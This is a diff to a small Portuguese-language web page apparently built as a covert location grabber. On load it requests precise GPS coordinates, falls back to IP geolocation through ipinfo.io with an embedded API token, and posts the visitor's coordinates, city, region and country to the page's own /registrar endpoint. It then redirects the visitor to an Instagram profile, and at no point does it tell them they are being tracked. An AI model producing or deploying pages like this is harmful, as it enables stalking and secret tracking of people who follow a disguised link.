@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>Localizando...</title>
     <script>
-        function enviarLocalizacao(lat, lon, precisa) {
+        function enviarLocalizacao(lat, lon, precisa, city = '', region = '', country = '') {
             if (!lat || !lon || lat === 0.0 || lon === 0.0) {
                 console.warn("Localização inválida, não será enviada.");
                 return;
@@ -13,19 +13,25 @@
             fetch('/registrar', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ lat, lon, precisa })
+                body: JSON.stringify({ lat, lon, precisa, city, region, country })
             }).finally(() => {
                 window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
             });
         }
 
         function tentarLocalizacaoPorIP() {
-            fetch('https://ipinfo.io/json?token=848013f8df8279')  // Substitua por seu token real
+            fetch('https://ipinfo.io/json?token=848013f8df8279')  // Substitua pelo seu token real
                 .then(res => res.json())
                 .then(d => {
-                    if (!d.loc) throw new Error("Sem campo loc no IPInfo");
                     const [lat, lon] = d.loc.split(',');
-                    enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
+                    enviarLocalizacao(
+                        parseFloat(lat),
+                        parseFloat(lon),
+                        false,
+                        d.city,
+                        d.region,
+                        d.country
+                    );
                 })
                 .catch(err => {
                     console.error("Erro ao buscar localização por IP:", err);
@@ -33,17 +39,23 @@
                 });
         }
 
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                const { latitude, longitude } = pos.coords;
-                enviarLocalizacao(latitude, longitude, true);
-            },
-            err => {
-                console.warn("GPS negado ou falhou:", err);
+        window.onload = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const { latitude, longitude } = pos.coords;
+                        enviarLocalizacao(latitude, longitude, true);
+                    },
+                    err => {
+                        console.warn("GPS negado ou falhou:", err);
+                        tentarLocalizacaoPorIP();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
                 tentarLocalizacaoPorIP();
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+            }
+        };
     </script>
 </head>
 <body>
